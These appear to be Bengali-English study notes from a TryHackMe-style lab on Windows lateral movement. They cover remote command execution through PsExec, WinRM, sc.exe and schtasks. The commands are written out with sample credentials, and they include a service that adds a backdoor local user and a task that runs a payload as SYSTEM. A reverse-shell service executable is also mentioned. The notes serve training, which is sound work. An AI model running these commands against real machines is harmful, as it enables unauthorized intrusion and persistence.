# **Spawning Processes Remotely**

## **1. What is Remote Process Creation?**

Remote process creation হলো valid credentials ব্যবহার করে network-এর অন্য machine-এ remotely command বা process execute করা।

এই task-এ চারটি technique দেখানো হয়েছে:

1. PsExec
2. WinRM
3. Remote Services (`sc.exe`)
4. Scheduled Tasks (`schtasks`)

## **2. PsExec**

- **Port:** `445/TCP` (SMB)
- **Required Group:** `Administrators`

PsExec হলো Sysinternals-এর একটি tool, যা administrator-কে remote PC-তে command execute করতে দেয়।

**কীভাবে কাজ করে:**

1. `Admin$` share-এ connect করে `psexesvc.exe` upload করে।
2. Service Control Manager (SCM)-এর মাধ্যমে `PSEXESVC` নামে service তৈরি ও চালু করে।
3. `C:\Windows\psexesvc.exe`-এর সঙ্গে service associate করে।
4. `stdin/stdout/stderr` handle করার জন্য named pipes তৈরি করে।

**Command:**

```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

- Remote host-এর administrator credentials এবং যে command চালাতে চাই তা দিতে হবে।
- THMJMP2-তে `C:\tools`-এ `psexec64.exe` পাওয়া যাবে।

## **3. Remote Process Creation Using WinRM**

- **Ports:**
  - `5985/TCP` — WinRM HTTP
  - `5986/TCP` — WinRM HTTPS
- **Required Group:** `Remote Management Users`

**WinRM (Windows Remote Management)** হলো web-based protocol, যা remotely Windows host-এ PowerShell command পাঠাতে ব্যবহার হয়। অধিকাংশ Windows Server-এ এটি default enabled থাকে।

**Command Prompt থেকে connection:**

```
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```

**PowerShell থেকে credentials তৈরি:**

```
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Interactive PowerShell session:

```
Enter-PSSession -Computername TARGET -Credential $credential
```

Remote command execute:

```
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

- `Enter-PSSession` → Remote interactive session তৈরি করে।
- `Invoke-Command` → Remote machine-এ ScriptBlock execute করে।
- দুটিতেই `PSCredential` object ব্যবহার করা হয়েছে।

## **4. Remotely Creating Services Using sc**

- **Ports:**
  - `135/TCP`, `49152-65535/TCP` — DCE/RPC
  - `445/TCP` — RPC over SMB Named Pipes
  - `139/TCP` — RPC over SMB Named Pipes
- **Required Group:** `Administrators`

Windows service start হলে নির্দিষ্ট command execute করতে পারে। তাই `sc.exe` দিয়ে remote machine-এ service তৈরি করে arbitrary command চালানো যায়।

### **sc.exe কীভাবে connect করে?**

`sc.exe` RPC ব্যবহার করে Service Control Manager-এর remote service program `SVCCTL`-এ connect করে।

1. প্রথমে DCE/RPC দিয়ে port `135`-এর Endpoint Mapper (EPM)-এ connect করে।
2. EPM, `SVCCTL`-এর IP ও port জানায়। সাধারণত dynamic port `49152-65535`।
3. এই connection ব্যর্থ হলে SMB Named Pipes ব্যবহার করে:
   - Port `445` — SMB
   - Port `139` — SMB over NetBIOS

### **Create and start service**

```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

- `THMservice` নামে service তৈরি হবে।
- Service start হলে `net user` command execute করে `munra` নামে local user তৈরি করবে।
- OS service চালায়, তাই command-এর output সরাসরি দেখা যাবে না।

**Stop ও delete:**

```
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

## **5. Creating Scheduled Tasks Remotely**

Windows-এর `schtasks` দিয়ে remote machine-এ Scheduled Task তৈরি ও execute করা যায়।

**Task তৈরি:**

```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

- `/s` → Target machine
- `/RU "SYSTEM"` → SYSTEM account হিসেবে চালাবে।
- `/create` → Task তৈরি করবে।
- `/tn` → Task name।
- `/tr` → Execute করার command/payload।
- `/sc ONCE` → একবার চালানোর schedule।
- `/sd` → Starting date।
- `/st` → Starting time।
- `/run` → Manually task চালাবে।

Task manually চালানো হবে, তাই `/sd` ও `/st`-এর সময় খুব গুরুত্বপূর্ণ নয়।

**Note:** System task চালানোর কারণে command output পাওয়া যাবে না। এটি একটি blind attack।

**Task delete:**

```
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

## **Quick Revision**

| Method     | Port                       | Required Group          |
| ---------- | -------------------------- | ----------------------- |
| PsExec     | 445/TCP                    | Administrators          |
| WinRM      | 5985/TCP, 5986/TCP         | Remote Management Users |
| `sc.exe`   | 135, 49152-65535, 445, 139 | Administrators          |
| `schtasks` | Source-এ উল্লেখ নেই        | Source-এ উল্লেখ নেই     |

**মনে রাখবে:**

- PsExec → `Admin$` + service + named pipes
- WinRM → Remote PowerShell
- `sc.exe` → Remote service create/start
- `schtasks` → Remote scheduled task create/run
- `exe-service` → Reverse shell-কে Windows service-compatible executable বানায়
